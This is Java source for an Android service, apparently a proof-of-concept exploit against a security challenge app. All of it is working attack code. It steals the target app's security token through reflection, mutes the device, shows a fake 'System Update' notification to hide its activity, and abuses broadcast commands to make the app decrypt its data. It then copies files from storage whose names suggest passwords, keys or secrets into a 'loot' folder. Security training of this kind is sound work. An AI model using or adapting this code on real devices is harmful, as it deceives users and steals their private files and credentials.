package com.nasr.andropseudoprotectpocagain;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.media.AudioManager;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.util.ArrayDeque;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Deque;
import java.util.List;

public class HarvestService extends Service {

    private static final String TAG = "Exploit";
    private static final String TARGET_APP = "com.eightksec.andropseudoprotect";
    private static final String CMD_START = TARGET_APP + ".START_SECURITY";
    private static final String CMD_STOP = TARGET_APP + ".STOP_SECURITY";
    private static final String EVENT_STARTED = TARGET_APP + ".SECURITY_STARTED";
    private static final String EVENT_DONE = TARGET_APP + ".DECRYPTION_COMPLETE";
    private static final String EXTRA_TOKEN = "security_token";
    private static final String CHANNEL_ID = "stealth_channel";
    private static final int NOTIFY_ID = 999;

    private BroadcastReceiver eventReceiver;
    private String authToken;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(this::executePlan).start();
        return START_NOT_STICKY;
    }

    private void executePlan() {
        // 1. Silence the device
        silenceAudio();

        // 2. Extract token from target app
        authToken = retrieveToken();
        if (authToken == null) {
            Log.e(TAG, "Token retrieval failed, stopping");
            stopSelf();
            return;
        }
        Log.i(TAG, "Token obtained: " + authToken);

        // 3. Close notification panel
        closeNotificationTray();

        // 4. Show fake system notification
        displayFakeNotification();

        // 5. Register to listen for target's broadcasts
        registerEventListener();

        // 6. Send START command
        Intent startIntent = new Intent(CMD_START)
                .setPackage(TARGET_APP)
                .putExtra(EXTRA_TOKEN, authToken);
        sendBroadcast(startIntent);
        Log.i(TAG, "START command sent, waiting for SECURITY_STARTED...");
    }

    private void silenceAudio() {
        try {
            AudioManager audio = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
            if (audio != null) {
                int[] streams = {
                        AudioManager.STREAM_MUSIC,
                        AudioManager.STREAM_NOTIFICATION,
                        AudioManager.STREAM_RING,
                        AudioManager.STREAM_ALARM,
                        AudioManager.STREAM_SYSTEM
                };
                for (int stream : streams) {
                    audio.setStreamVolume(stream, 0, 0);
                }
                Log.i(TAG, "Audio silenced");
            }
        } catch (Exception e) {
            Log.w(TAG, "Audio silencing failed: " + e.getMessage());
        }
    }

    private String retrieveToken() {
        try {
            Context targetContext = createPackageContext(TARGET_APP,
                    Context.CONTEXT_INCLUDE_CODE | Context.CONTEXT_IGNORE_SECURITY);
            ClassLoader loader = targetContext.getClassLoader();
            Class<?> utilsClass = loader.loadClass(TARGET_APP + ".SecurityUtils");
            Object instance = utilsClass.getDeclaredConstructor().newInstance();
            Method getter = utilsClass.getMethod("getSecurityToken");
            return (String) getter.invoke(instance);
        } catch (Exception e) {
            Log.e(TAG, "Token extraction error", e);
            return null;
        }
    }

    private void closeNotificationTray() {
        try {
            Intent closeIntent = new Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS);
            sendBroadcast(closeIntent);
            Log.i(TAG, "Notification tray closed");
        } catch (Exception e) {
            Log.w(TAG, "Cannot close tray: " + e.getMessage());
        }
    }

    private void displayFakeNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                NotificationChannel channel = new NotificationChannel(CHANNEL_ID,
                        "System Updates", NotificationManager.IMPORTANCE_LOW);
                NotificationManager mgr = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
                mgr.createNotificationChannel(channel);

                Notification notification = new Notification.Builder(this, CHANNEL_ID)
                        .setSmallIcon(android.R.drawable.ic_dialog_info)
                        .setContentTitle("System Update")
                        .setContentText("Checking for updates...")
                        .setPriority(Notification.PRIORITY_LOW)
                        .setOngoing(false)
                        .setAutoCancel(true)
                        .build();

                mgr.notify(NOTIFY_ID, notification);
                Log.i(TAG, "Fake notification displayed");
            } catch (Exception e) {
                Log.w(TAG, "Fake notification failed: " + e.getMessage());
            }
        }
    }

    private void registerEventListener() {
        eventReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                String action = intent.getAction();
                if (EVENT_STARTED.equals(action)) {
                    Log.i(TAG, "Received SECURITY_STARTED → sending STOP");
                    closeNotificationTray();

                    Intent stopIntent = new Intent(CMD_STOP)
                            .setPackage(TARGET_APP)
                            .putExtra(EXTRA_TOKEN, authToken);
                    sendBroadcast(stopIntent);
                } else if (EVENT_DONE.equals(action)) {
                    Log.i(TAG, "Received DECRYPTION_COMPLETE → harvesting files");
                    closeNotificationTray();

                    harvestFiles();
                    cleanUp();
                }
            }
        };

        IntentFilter filter = new IntentFilter();
        filter.addAction(EVENT_STARTED);
        filter.addAction(EVENT_DONE);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(eventReceiver, filter, Context.RECEIVER_EXPORTED);
        } else {
            registerReceiver(eventReceiver, filter);
        }
    }

    private void harvestFiles() {
        File root = Environment.getExternalStorageDirectory();
        File outputBase = getExternalFilesDir(null);
        if (outputBase == null) {
            Log.e(TAG, "Cannot access external files dir");
            return;
        }
        File lootDir = new File(outputBase, "loot");
        if (!lootDir.exists()) lootDir.mkdirs();

        Log.i(TAG, "Scanning: " + root.getAbsolutePath());
        int copied = recursiveCopy(root, lootDir, root.getAbsolutePath());
        Log.i(TAG, "Copied " + copied + " files to " + lootDir.getAbsolutePath());

        showTextFileSamples(lootDir);
    }

    private int recursiveCopy(File source, File destBase, String basePath) {
        int count = 0;
        Deque<File> stack = new ArrayDeque<>();
        stack.push(source);

        while (!stack.isEmpty()) {
            File current = stack.pop();
            try {
                if (current.isDirectory()) {
                    File[] children = current.listFiles();
                    if (children != null && children.length < 1000) {
                        Collections.addAll(stack, children);
                    }
                } else if (isValuableFile(current)) {
                    String relative = current.getAbsolutePath().substring(basePath.length());
                    if (relative.startsWith("/")) relative = relative.substring(1);
                    File destination = new File(destBase, relative);
                    File parent = destination.getParentFile();
                    if (parent != null && !parent.exists()) parent.mkdirs();

                    try (InputStream in = new FileInputStream(current);
                         OutputStream out = new FileOutputStream(destination)) {
                        byte[] buffer = new byte[8192];
                        int len;
                        while ((len = in.read(buffer)) > 0) {
                            out.write(buffer, 0, len);
                        }
                        Log.i(TAG, "Stolen: " + current.getName());
                        count++;
                    } catch (IOException e) {
                        Log.w(TAG, "Copy failed for " + current.getName());
                    }
                }
            } catch (SecurityException ignored) {
                // Ignore inaccessible directories
            }
        }
        return count;
    }

    private boolean isValuableFile(File file) {
        if (file == null || !file.exists() || file.length() == 0) return false;
        if (file.length() > 10 * 1024 * 1024) return false; // skip >10MB
        String name = file.getName().toLowerCase();
        return name.endsWith(".txt") || name.endsWith(".pdf") ||
                name.endsWith(".doc") || name.endsWith(".docx") ||
                name.contains("secret") || name.contains("password") ||
                name.contains("key") || name.contains("private") ||
                name.contains("flag");
    }

    private void showTextFileSamples(File dir) {
        List<File> texts = collectTextFiles(dir);
        int displayed = 0;
        for (File f : texts) {
            if (displayed >= 3) break;
            Log.i(TAG, "=== " + f.getName() + " ===");
            try (BufferedReader reader = new BufferedReader(new FileReader(f))) {
                for (int i = 0; i < 8; i++) {
                    String line = reader.readLine();
                    if (line == null) break;
                    Log.i(TAG, "   " + line);
                }
            } catch (IOException ignored) {}
            Log.i(TAG, "=== end ===");
            displayed++;
        }
    }

    private List<File> collectTextFiles(File directory) {
        List<File> result = new ArrayList<>();
        if (directory == null || !directory.exists()) return result;
        File[] files = directory.listFiles();
        if (files == null) return result;
        for (File f : files) {
            if (f.isDirectory()) {
                result.addAll(collectTextFiles(f));
            } else if (f.getName().toLowerCase().endsWith(".txt")) {
                result.add(f);
            }
        }
        return result;
    }

    private void cleanUp() {
        try {
            unregisterReceiver(eventReceiver);
        } catch (Exception ignored) {}
        try {
            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            nm.cancel(NOTIFY_ID);
        } catch (Exception ignored) {}
        stopSelf();
        Log.i(TAG, "Operation completed successfully");
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}